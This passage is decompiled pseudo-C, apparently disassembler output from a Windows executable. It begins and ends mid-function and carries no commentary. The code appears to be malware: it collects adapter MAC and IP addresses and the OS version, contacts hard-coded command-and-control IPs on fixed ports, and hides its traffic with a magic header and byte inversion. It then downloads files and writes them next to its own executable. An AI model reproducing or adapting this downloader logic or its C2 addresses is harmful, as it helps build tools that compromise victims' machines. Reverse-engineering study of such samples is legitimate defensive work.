  undefined local_c0 [74];
  undefined4 local_76;
  undefined2 local_72;
  undefined4 local_70;
  short local_68 [34];
  undefined2 local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_c0;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  _memset(local_c0,0,0x9a);
  _memset(param_1,0,0x200);
  iVar3 = FUN_00403140(local_c0);
  if (iVar3 != 0) {
    *param_1 = 0x1000000;
    param_1[1] = (((uint)DAT_0043768b * 0x100 + (uint)DAT_0043768a) * 0x100 + (uint)DAT_00437689) *
                 0x100 + (uint)DAT_00437688;
    param_1[4] = local_76;
    *(undefined2 *)(param_1 + 5) = local_72;
    psVar5 = local_68;
    param_1[3] = local_70;
    param_1[2] = 0x100025b;
    iVar3 = 0x16 - (int)psVar5;
    do {
      sVar1 = *psVar5;
      *(short *)((int)param_1 + iVar3 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    iVar3 = FUN_00401000();
    pwVar4 = u_UnKmownOS_00433fc0 + iVar3 * 10;
    iVar3 = 0x96 - (int)pwVar4;
    do {
      wVar2 = *pwVar4;
      *(wchar_t *)((int)param_1 + iVar3 + (int)pwVar4) = wVar2;
      pwVar4 = pwVar4 + 1;
    } while (wVar2 != L'\0');
    *(uint *)((int)param_1 + 0x196) = DAT_00437786;
    *(undefined4 *)((int)param_1 + 0x19a) = DAT_0043778a;
    psVar5 = &DAT_0043778e;
    do {
      sVar1 = *psVar5;
      *(short *)((int)(param_1 + -0x10dd7c) + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    FUN_004024b0(DAT_00437786);
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_c0);
  return;
}



void __fastcall FUN_00403140(void *param_1)

{
  undefined4 *puVar1;
  uint uVar2;
  int iVar3;
  int local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_48;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 0;
  local_48 = 0;
  _memset(param_1,0,0x9a);
  iVar3 = 0;
  do {
    puVar1 = (undefined4 *)FUN_0040a3f1(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    (&local_44)[iVar3] = puVar1;
    puVar1[5] = 0;
    iVar3 = iVar3 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar3 < 10);
  FUN_00403270(&local_48,(undefined4 *)((int)param_1 + 0x4a),&local_44);
  if (0 < local_48) {
    uVar2 = FUN_00402e10(local_44);
    *(uint *)((int)param_1 + 0x50) = uVar2;
    local_44 = local_44 & 0xffff0000;
    _memset((void *)((int)&local_44 + 2),0,0x3e);
    iVar3 = FUN_00403410();
    if (iVar3 == 1) {
      _wcscpy_s((wchar_t *)((int)param_1 + 0x58),0x21,(wchar_t *)&local_44);
      ___security_check_cookie_4(local_4 ^ (uint)&local_48);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)&local_48);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_48);
  return;
}



void __fastcall FUN_00403270(undefined4 param_1,undefined4 *param_2,undefined4 param_3)

{
  char cVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *_Memory;
  int iVar4;
  undefined4 *puVar5;
  int iVar6;
  uint uVar7;
  size_t unaff_EBX;
  int iVar8;
  bool bVar9;
  int *local_3c;
  undefined4 *local_38;
  wchar_t awStack_34 [2];
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 *local_28;
  undefined2 local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined2 local_16;
  undefined2 uStack_14;
  undefined2 local_12;
  undefined2 uStack_10;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_3c;
  local_30 = param_3;
  local_3c = (int *)0xffffffff;
  local_24 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  uStack_14 = 0;
  local_12 = 0;
  uStack_10 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  iVar8 = 0;
  local_2c = param_1;
  local_28 = param_2;
  _Memory = (undefined4 *)_malloc(0x288);
  local_38 = (undefined4 *)0x288;
  iVar4 = GetAdaptersInfo(_Memory);
  if (iVar4 == 0x6f) {
    _free(_Memory);
    _Memory = (undefined4 *)_malloc(unaff_EBX);
  }
  iVar4 = GetAdaptersInfo(_Memory,&stack0xffffffc0);
  puVar3 = _Memory;
  if (iVar4 == 0) {
    for (; puVar3 != (undefined4 *)0x0; puVar3 = (undefined4 *)*puVar3) {
      if (param_2 != (undefined4 *)0x0) {
        *param_2 = puVar3[0x65];
        *(undefined2 *)(param_2 + 1) = *(undefined2 *)(puVar3 + 0x66);
      }
      for (puVar2 = puVar3 + 0x6b; puVar2 != (undefined4 *)0x0; puVar2 = (undefined4 *)*puVar2) {
        puVar5 = puVar2 + 1;
        do {
          cVar1 = *(char *)puVar5;
          puVar5 = (undefined4 *)((int)puVar5 + 1);
        } while (cVar1 != '\0');
        iVar4 = (int)puVar5 - ((int)puVar2 + 5);
        if (0x10 < iVar4) {
          iVar4 = 0x10;
        }
        iVar6 = 0;
        if (-1 < iVar4) {
          bVar9 = iVar4 == 0;
          do {
            if (bVar9) {
              awStack_34[iVar6] = L'\0';
            }
            awStack_34[iVar6] = (short)*(char *)((int)(puVar2 + 1) + iVar6);
            iVar6 = iVar6 + 1;
            bVar9 = iVar6 == iVar4;
          } while (iVar6 <= iVar4);
        }
        uVar7 = FUN_00402e10(awStack_34);
        if (uVar7 != 0) {
          _wcscpy_s(*(wchar_t **)(unaff_EBX + iVar8 * 4),0x10,awStack_34);
        }
        iVar8 = iVar8 + 1;
        param_2 = local_38;
      }
      if (0 < iVar8) break;
    }
  }
  *local_3c = iVar8;
  if (_Memory != (undefined4 *)0x0) {
    _free(_Memory);
  }
  ___security_check_cookie_4(CONCAT22(local_12,uStack_14) ^ (uint)&stack0xffffffb4);
  return;
}



undefined4 FUN_00403410(void)

{
  wchar_t wVar1;
  undefined4 *puVar2;
  wchar_t *pwVar3;
  uint uVar4;
  LPCSTR *ppCVar5;
  wchar_t *unaff_EBX;
  int iVar6;
  int local_34 [3];
  wchar_t *local_28 [10];
  
  local_28[0] = (wchar_t *)0x0;
  local_28[1] = (wchar_t *)0x0;
  local_28[2] = (wchar_t *)0x0;
  local_28[3] = (wchar_t *)0x0;
  local_28[4] = (wchar_t *)0x0;
  local_28[5] = (wchar_t *)0x0;
  local_28[6] = (wchar_t *)0x0;
  local_28[7] = (wchar_t *)0x0;
  local_28[8] = (wchar_t *)0x0;
  local_28[9] = (wchar_t *)0x0;
  local_34[0] = 0;
  iVar6 = 0;
  do {
    puVar2 = (undefined4 *)FUN_0040a3f1(0x20);
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[2] = 0;
    puVar2[3] = 0;
    puVar2[4] = 0;
    local_28[iVar6] = (wchar_t *)puVar2;
    puVar2[5] = 0;
    iVar6 = iVar6 + 1;
    puVar2[6] = 0;
    puVar2[7] = 0;
  } while (iVar6 < 10);
  pwVar3 = unaff_EBX;
  do {
    wVar1 = *pwVar3;
    pwVar3 = pwVar3 + 1;
  } while (wVar1 != L'\0');
  if (((int)pwVar3 - (int)(unaff_EBX + 1) >> 1 == 0) || (unaff_EBX == (wchar_t *)0x0)) {
    FUN_00403270(local_34,(undefined4 *)0x0,local_28);
    if (local_34[0] == 0) {
      return 0;
    }
  }
  else {
    _wcscpy_s(local_28[0],0x10,unaff_EBX);
  }
  uVar4 = FUN_00402e10(local_28[0]);
  local_34[0] = Ordinal_8(uVar4);
  ppCVar5 = (LPCSTR *)Ordinal_51(local_34,4,2);
  if (ppCVar5 == (LPCSTR *)0x0) {
    return 0;
  }
  FUN_00403510(*ppCVar5);
  return 1;
}



LPWSTR __cdecl FUN_00403510(LPCSTR param_1)

{
  char cVar1;
  LPWSTR in_EAX;
  LPCSTR pCVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0x20;
  pCVar2 = param_1;
  do {
    cVar1 = *pCVar2;
    pCVar2 = pCVar2 + 1;
  } while (cVar1 != '\0');
  iVar3 = (int)pCVar2 - (int)(param_1 + 1);
  if (in_EAX == (LPWSTR)0x0) {
    iVar4 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    in_EAX = (LPWSTR)_malloc(iVar4 * 2);
  }
  if (iVar3 == 0) {
    *in_EAX = L'\0';
    return in_EAX;
  }
  if ((0 < iVar4) && (iVar4 + -1 < iVar3)) {
    iVar3 = iVar4 + -1;
  }
  MultiByteToWideChar(0,0,param_1,-1,in_EAX,iVar3 + 1);
  return in_EAX;
}



void __cdecl FUN_00403650(uint param_1)

{
  char *unaff_ESI;
  char local_14;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined2 local_7;
  undefined local_5;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_14;
  local_14 = '\0';
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_5 = 0;
  FUN_00404c50(param_1 >> 0x10 & 0xff,&local_14,"%d.%d.%d.%d");
  _strcpy_s(unaff_ESI,0x10,&local_14);
  ___security_check_cookie_4(local_4 ^ (uint)&local_14);
  return;
}



void FUN_004036d0(void)

{
  wchar_t *pwVar1;
  wchar_t *unaff_ESI;
  WCHAR local_20c [260];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_20c;
  GetModuleFileNameW((HMODULE)0x0,local_20c,0x104);
  pwVar1 = _wcsrchr(local_20c,L'\\');
  *pwVar1 = L'\0';
  _wcscpy_s(unaff_ESI,0x104,local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)local_20c);
  return;
}



void FUN_00403730(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&local_18;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  local_18 = 0;
  iVar1 = FUN_00403830(s_218_54_31_226_00433fa0,(uint)DAT_00433fb0);
  if (iVar1 != 0) {
    if (DAT_00433fbc == 3) {
      uVar4 = 0x2bac;
    }
    else {
      uVar4 = 0x2ba2;
    }
    iVar2 = FUN_00403830("1.234.83.146",uVar4);
    if (iVar2 != 0) {
      if (DAT_00437786 != 0) {
        FUN_00403650(DAT_00437786);
      }
      iVar3 = FUN_00403830(&local_18,(uint)DAT_00433fb0);
      if (iVar3 == 0) {
        ___security_check_cookie_4(local_8 ^ (uint)&local_18);
        return;
      }
      if (((iVar1 == 1) && (iVar2 == 1)) && (iVar3 == 1)) {
        FUN_00403830("133.242.129.155",(uint)DAT_00433fb0);
      }
      ___security_check_cookie_4(local_8 ^ (uint)&local_18);
      return;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_18);
  return;
}



void __cdecl FUN_00403830(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  uint uVar4;
  undefined *puVar5;
  wchar_t *pwVar6;
  int local_434;
  undefined local_430;
  undefined4 local_42f;
  undefined4 local_42b;
  undefined4 local_427;
  undefined4 local_423;
  undefined2 local_41f;
  undefined local_41d;
  wchar_t local_41c;
  undefined local_41a [518];
  wchar_t local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&local_434;
  local_434 = FUN_00403a00(param_2);
  if (local_434 == 0) {
    local_41c = L'\0';
    _memset(local_41a,0,0x206);
    local_214 = L'\0';
    _memset(local_212,0,0x206);
    FUN_004036d0();
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_0042c888);
    local_430 = 0;
    local_42f = 0;
    local_42b = 0;
    local_427 = 0;
    local_423 = 0;
    local_41f = 0;
    local_41d = 0;
    pwVar6 = &DAT_00436b68;
    puVar5 = &stack0xffbc8f64;
    do {
      if (*pwVar6 != L'\0') {
        _wcscpy_s(&local_214,0x104,&local_41c);
        _wcscat_s(&local_214,0x104,pwVar6);
        iVar1 = FUN_00406100(&local_214);
        if (iVar1 != 0) {
          piVar2 = (int *)(pwVar6 + 0x82);
          uVar4 = 0x14;
          do {
            if (*(int *)(puVar5 + (int)piVar2) != *piVar2) goto LAB_00403967;
            uVar4 = uVar4 - 4;
            piVar2 = piVar2 + 1;
          } while (3 < uVar4);
          *pwVar6 = L'\0';
        }
      }
LAB_00403967:
      pwVar6 = pwVar6 + 0x8c;
      puVar5 = puVar5 + -0x118;
    } while ((int)pwVar6 < 0x4370e0);
    pwVar6 = &DAT_00436b68;
    do {
      if (*pwVar6 != L'\0') {
        FUN_00404260(pwVar6,param_1,param_2);
      }
      pwVar6 = pwVar6 + 0x8c;
    } while ((int)pwVar6 < 0x4370e0);
    _wcscat_s(&local_41c,0x104,(wchar_t *)&DAT_00437b38);
    DVar3 = GetFileAttributesW(&local_41c);
    if (DVar3 == 0xffffffff) {
      local_434 = 2;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_434);
  return;
}



void __cdecl FUN_00403a00(undefined4 param_1)

{
  wchar_t *_Src;
  void *_Dst;
  uint uVar1;
  int iVar2;
  ushort uVar3;
  undefined4 *puVar4;
  size_t sVar5;
  undefined4 *puVar6;
  undefined4 local_c18;
  uint local_c14;
  int local_c10;
  size_t local_c0c;
  undefined2 local_c08;
  undefined local_c06 [2046];
  undefined4 local_408 [257];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_c18;
  local_c18 = 0;
  puVar4 = &DAT_00437938;
  puVar6 = local_408;
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar6 = puVar6 + 1;
  }
  _Dst = _malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_c0c = 0x10000;
  local_c08 = 0;
  _memset(local_c06,0,0x7fe);
  local_c10 = 0;
  local_c14 = 0;
  iVar2 = FUN_00403c10(param_1,&local_c08);
  if (iVar2 == 0) {
    local_c18 = 1;
  }
  else {
    iVar2 = FUN_00403d30((undefined2 *)local_408,&local_c10,0xbb9,0x200,&local_c08);
    if (iVar2 == 0) {
      local_c18 = 3;
    }
    else {
      if (_Dst == (void *)0x0) goto LAB_00403bda;
      iVar2 = FUN_00403f10(_Dst,&local_c10,(undefined2 *)&local_c14,&local_c0c,&local_c08);
      sVar5 = local_c0c;
      if (((iVar2 == 0) || ((short)local_c14 != 0xbb9)) || (local_c0c == 0)) {
        local_c18 = 2;
      }
      else {
        _memset(&DAT_00436b68,0,0x578);
        uVar3 = 0;
        local_c14 = 0;
        if (0x117 < (int)sVar5) {
          uVar1 = 0;
          do {
            _Src = (wchar_t *)(uVar1 + (int)_Dst);
            if ((*(short *)(uVar1 + (int)_Dst) != 0) && (uVar3 < 5)) {
              uVar1 = (uint)uVar3;
              _wcscpy_s(&DAT_00436b68 + uVar1 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_00436c6c + uVar1 * 0x46,0x14,_Src + 0x82,0x14);
              (&DAT_00436c68)[uVar1 * 0x46] = *(undefined4 *)(_Src + 0x80);
              uVar3 = uVar3 + 1;
              sVar5 = local_c0c;
            }
            local_c14 = local_c14 + 0x118;
            uVar1 = local_c14 & 0xffff;
          } while ((int)(uVar1 + 0x118) <= (int)sVar5);
        }
      }
    }
  }
  if (_Dst != (void *)0x0) {
    _free(_Dst);
  }
LAB_00403bda:
  if (local_c10 != 0) {
    Ordinal_3(local_c10);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_c18);
  return;
}



void __cdecl FUN_00403c10(undefined4 param_1,undefined2 *param_2)

{
  undefined2 uVar1;
  int iVar2;
  undefined2 *puVar3;
  int *unaff_ESI;
  undefined4 uStack_9bc;
  undefined4 uStack_9b8;
  undefined4 local_9b0 [5];
  undefined local_99c [400];
  undefined2 local_80c [1020];
  uint uStack_14;
  uint uStack_10;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)local_9b0;
  puVar3 = local_80c;
  if (param_2 != (undefined2 *)0x0) {
    puVar3 = param_2;
  }
  *puVar3 = 0;
  uStack_9b8 = local_99c;
  uStack_9bc = 0x101;
  local_9b0[0] = 0;
  iVar2 = Ordinal_115();
  if (iVar2 != 0) {
LAB_00403c58:
    uStack_9bc = 0x403c69;
    ___security_check_cookie_4(uStack_10 ^ (uint)&uStack_9b8);
    return;
  }
  iVar2 = Ordinal_23(2,1);
  *unaff_ESI = iVar2;
  if (iVar2 == -1) goto LAB_00403c58;
  iVar2 = Ordinal_52();
  if (iVar2 == 0) {
    Ordinal_11();
    iVar2 = Ordinal_51(&stack0xfffff640,4,2);
    if (iVar2 == 0) goto LAB_00403d05;
  }
  uStack_9b8 = (undefined *)CONCAT22(uStack_9b8._2_2_,2);
  uVar1 = Ordinal_9(local_8);
  uStack_9bc = CONCAT22(uVar1,(undefined2)uStack_9bc);
  iVar2 = Ordinal_4(*unaff_ESI,&uStack_9bc,0x10);
  if (iVar2 == 0) {
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_9bc);
    return;
  }
LAB_00403d05:
  if (*unaff_ESI != 0) {
    Ordinal_3(*unaff_ESI);
    *unaff_ESI = 0;
  }
  ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_9bc);
  return;
}



void __fastcall
FUN_00403d30(undefined2 *param_1,int *param_2,undefined2 param_3,size_t param_4,undefined2 *param_5)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  uint unaff_retaddr;
  undefined4 local_810;
  int *local_80c;
  undefined2 *local_808;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_810;
  puVar1 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar1 = param_5;
  }
  *puVar1 = 0;
  local_810 = 0;
  local_80c = param_2;
  local_808 = param_1;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    puVar1 = (undefined2 *)FUN_0040a3f1(0x1000);
    _Size = param_4;
    if (0xffa < (int)param_4) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_4;
    if ((param_1 == (undefined2 *)0x0) && (param_4 == 0)) {
      iVar2 = FUN_00403e70(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        local_810 = 1;
      }
    }
    else {
      _memcpy(puVar1 + 3,param_1,_Size);
      iVar2 = FUN_00403e70(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_4; _Size = _Size + _Size_00) {
          _Size_00 = param_4 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          _memcpy(puVar1,(void *)((int)local_808 + _Size),_Size_00);
          iVar2 = FUN_00403e70(local_80c,puVar1);
          if (iVar2 == 0) goto LAB_00403e45;
        }
        local_810 = 1;
      }
    }
  }
LAB_00403e45:
  if (param_1 != (undefined2 *)0x0) {
    FUN_0040a3fc(param_1);
  }
  local_810 = 0x403e68;
  ___security_check_cookie_4(unaff_retaddr ^ (uint)&local_80c);
  return;
}



undefined4 __cdecl FUN_00403e70(int *param_1,void *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  size_t unaff_EDI;
  undefined4 local_4;
  
  iVar2 = 0;
  local_4 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)FUN_0040a3f1(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
    *(undefined4 *)((int)piVar3 + 2) = DAT_0043403c;
    *(undefined *)((int)piVar3 + 6) = DAT_00434040;
    _memcpy((void *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_4 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    FUN_0040a3fc(param_1);
  }
  return local_4;
}



void __fastcall
FUN_00403f10(void *param_1,int *param_2,undefined2 *param_3,size_t *param_4,undefined2 *param_5)

{
  size_t _Size;
  undefined2 *puVar1;
  undefined2 *_Src;
  int iVar2;
  undefined4 extraout_ECX;
  size_t sVar3;
  size_t sVar4;
  size_t sVar5;
  size_t sVar6;
  uint unaff_retaddr;
  size_t local_81c;
  void *local_818;
  undefined2 *local_814;
  undefined4 local_810;
  undefined2 *local_80c;
  int *local_808;
  undefined2 local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_81c;
  local_814 = param_3;
  local_804 = 0;
  local_818 = param_1;
  local_808 = param_2;
  _memset(local_802,0,0x7fe);
  local_80c = &local_804;
  if (param_5 != (undefined2 *)0x0) {
    local_80c = param_5;
  }
  puVar1 = local_80c;
  *local_80c = 0;
  local_810 = 0;
  if ((*param_2 != 0) && (local_818 != (void *)0x0)) {
    local_81c = 0x1000;
    _Src = (undefined2 *)FUN_0040a3f1(0x1000);
    iVar2 = FUN_004040d0(extraout_ECX,_Src,local_808,&local_81c,puVar1);
    sVar4 = local_81c;
    if ((iVar2 != 0) && (sVar3 = local_81c - 6, -1 < (int)sVar3)) {
      *local_814 = *_Src;
      local_814 = *(undefined2 **)(_Src + 1);
      sVar4 = *param_4;
      if ((int)sVar4 < (int)sVar3) {
        sVar6 = 0;
        if (0 < (int)sVar4) {
          _memcpy(local_818,_Src + 3,sVar4);
          sVar6 = *param_4;
        }
      }
      else {
        _memcpy(local_818,_Src + 3,sVar3);
        sVar6 = sVar3;
      }
      sVar5 = sVar6;
      if ((int)sVar3 < (int)local_814) {
        do {
          local_81c = 0x1000;
          iVar2 = FUN_004040d0(local_808,_Src,local_808,&local_81c,local_80c);
          _Size = local_81c;
          sVar4 = local_81c;
          if ((iVar2 == 0) || (sVar4 = sVar3 + local_81c, 0x10000 < (int)sVar4)) goto LAB_004040a2;
          sVar3 = *param_4;
          sVar6 = sVar5 + local_81c;
          local_81c = sVar4;
          if ((int)sVar3 < (int)sVar6) {
            sVar6 = sVar5;
            if ((int)sVar5 < (int)sVar3) {
              _memcpy((void *)((int)local_818 + sVar5),_Src,sVar3 - sVar5);
              sVar6 = *param_4;
            }
          }
          else {
            _memcpy((void *)((int)local_818 + sVar5),_Src,_Size);
          }
          sVar3 = local_81c;
          sVar5 = sVar6;
        } while ((int)local_81c < (int)local_814);
      }
      *param_4 = sVar6;
      local_810 = 1;
      sVar4 = local_81c;
    }
LAB_004040a2:
    local_81c = sVar4;
    if (_Src != (undefined2 *)0x0) {
      FUN_0040a3fc(_Src);
    }
  }
  local_81c = 0x4040c5;
  ___security_check_cookie_4(unaff_retaddr ^ (uint)&local_818);
  return;
}



void __fastcall
FUN_004040d0(undefined4 param_1,void *param_2,int *param_3,size_t *param_4,undefined2 *param_5)

{
  size_t *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  byte *pbVar5;
  undefined2 *puVar6;
  size_t _Size;
  uint uVar7;
  size_t sVar8;
  undefined4 local_8d8;
  void *local_8d4;
  size_t *local_8d0;
  undefined2 local_8cc;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_8d8;
  local_8d0 = param_4;
  puVar6 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar6 = param_5;
  }
  *puVar6 = 0;
  iVar2 = *param_3;
  local_8d8 = 0;
  local_8d4 = param_2;
  if ((iVar2 != 0) && (param_2 != (void *)0x0)) {
    local_8cc = local_8cc & 0xff00;
    _memset((void *)((int)&local_8cc + 1),0,199);
    iVar2 = Ordinal_16(iVar2,&local_8cc,2,0);
    if ((iVar2 == -1) || (iVar2 == 0)) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_8d8);
      return;
    }
    uVar7 = (uint)local_8cc;
    iVar2 = 0;
    piVar3 = (int *)FUN_0040a3f1(uVar7 + 2);
    if (uVar7 != 0) {
      do {
        iVar4 = Ordinal_16(*param_3,iVar2 + (int)piVar3,uVar7 - iVar2,0);
        psVar1 = local_8d0;
        if ((iVar4 == -1) || (iVar4 == 0)) {
          Ordinal_111();
          goto LAB_0040421b;
        }
        iVar2 = iVar2 + iVar4;
      } while (iVar2 < (int)uVar7);
      if (((4 < iVar2) && (_Size = iVar2 - 5, DAT_0043403c == *piVar3)) &&
         (*(char *)(piVar3 + 1) == DAT_00434040)) {
        if (0 < (int)_Size) {
          pbVar5 = (byte *)((int)piVar3 + 5);
          sVar8 = _Size;
          do {
            *pbVar5 = ~*pbVar5;
            pbVar5 = pbVar5 + 1;
            sVar8 = sVar8 - 1;
          } while (sVar8 != 0);
        }
        if ((int)*local_8d0 < (int)_Size) {
          _memcpy(local_8d4,(void *)((int)piVar3 + 5),*local_8d0);
        }
        else {
          _memcpy(local_8d4,(void *)((int)piVar3 + 5),_Size);
          *psVar1 = _Size;
        }
        local_8d8 = 1;
      }
    }
LAB_0040421b:
    if (piVar3 != (int *)0x0) {
      FUN_0040a3fc(piVar3);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_8d8);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00404260(wchar_t *param_1,undefined4 param_2,undefined4 param_3)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  char *_Dst;
  wchar_t *pwVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined auStack_1030 [4];
  FILE *local_102c;
  int local_1028;
  undefined4 local_1024;
  size_t local_1020;
  undefined4 local_101c;
  wchar_t local_1018;
  undefined local_1016 [518];
  WCHAR local_e10 [260];
  wchar_t local_c08;
  undefined4 local_c06 [255];
  undefined2 local_808;
  undefined local_806 [2050];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)auStack_1030;
  local_101c = param_2;
  _memset(&local_c08,0,0x400);
  _wcscpy_s(&local_c08,0x1ff,param_1);
  pwVar2 = param_1;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  puVar5 = &DAT_00437938;
  puVar6 = (undefined4 *)((int)local_c06 + ((int)pwVar2 - (int)(param_1 + 1) >> 1) * 2);
  for (iVar4 = 0x80; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  pwVar2 = param_1 + 1;
  do {
    wVar1 = *param_1;
    param_1 = param_1 + 1;
  } while (wVar1 != L'\0');
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_1020 = 0x10000;
  local_808 = 0;
  _memset(local_806,0,0x7fe);
  local_1028 = 0;
  local_102c = (FILE *)0x0;
  local_1024 = 0;
  local_1018 = L'\0';
  _memset(local_1016,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,local_e10,0x104);
  pwVar3 = _wcsrchr(local_e10,L'\\');
  *pwVar3 = L'\0';
  _wcscpy_s(&local_1018,0x104,local_e10);
  _wcscat_s(&local_1018,0x103,(wchar_t *)&DAT_0042c888);
  iVar4 = FUN_00403c10(param_3,&local_808);
  if (iVar4 != 0) {
    iVar4 = FUN_00403d30(&local_c08,&local_1028,0xbba,((int)param_1 - (int)pwVar2 >> 1) * 2 + 0x202,
                         &local_808);
    if (iVar4 != 0) {
      iVar4 = FUN_00403f10(_Dst,&local_1028,(undefined2 *)&local_1024,&local_1020,&local_808);
      if ((((iVar4 != 0) && ((short)local_1024 == 0xbba)) && (local_1020 != 0)) && (*_Dst == '\0'))
      {
        _wcscat_s(&local_1018,0x104,(wchar_t *)&DAT_00437b38);
        local_102c = (FILE *)0x0;
        __wfopen_s(&local_102c,&local_1018,L"wb");
        if (local_102c != (FILE *)0x0) {
          FUN_004044e0(&local_102c);
        }
        local_102c = (FILE *)0x1;
      }
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  if (local_1028 != 0) {
    Ordinal_3(local_1028);
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_1030);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_004044e0(undefined4 param_1)

{
  int iVar1;
  size_t _Count;
  uint uVar2;
  undefined4 *unaff_EDI;
  uint uStack_101c;
  FILE **ppFStack_1018;
  undefined local_100c [4];
  undefined4 local_1008;
  uint uStack_14;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_100c;
  uVar2 = 0;
